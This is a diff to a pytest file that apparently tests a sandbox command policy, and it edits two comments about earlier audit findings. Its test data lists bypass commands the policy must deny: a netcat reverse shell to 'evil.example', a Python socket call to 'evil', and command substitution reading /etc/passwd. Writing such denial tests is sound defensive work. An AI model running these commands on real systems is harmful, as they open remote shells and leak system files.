@@ -104,7 +104,7 @@ def test_check_command_denies(policy, cmd):
 @pytest.mark.parametrize(
     "cmd",
     [
-        # The seven confirmed bypasses from the Oct 28 audit — all must now be denied.
+        # The seven confirmed bypasses — all must now be denied.
         "pytest; python -c 'import socket; socket.create_connection((\"evil\", 80))'",
         "python -m pytest && nc -e /bin/sh evil.example 4444",
         "npm test $(cat /etc/passwd)",
@@ -143,7 +143,7 @@ def test_check_command_legit(policy, cmd):
 
 
 def test_canaries_are_random_and_match_secret_shapes():
-    """Oct 29 audit: fixed doc-example keys are trivially skip-listed. Values must be
+    """Fixed doc-example keys are trivially skip-listed. Values must be
     per-run random while still matching the secret-shape regexes."""
     from app.sandbox.base import make_canaries
 
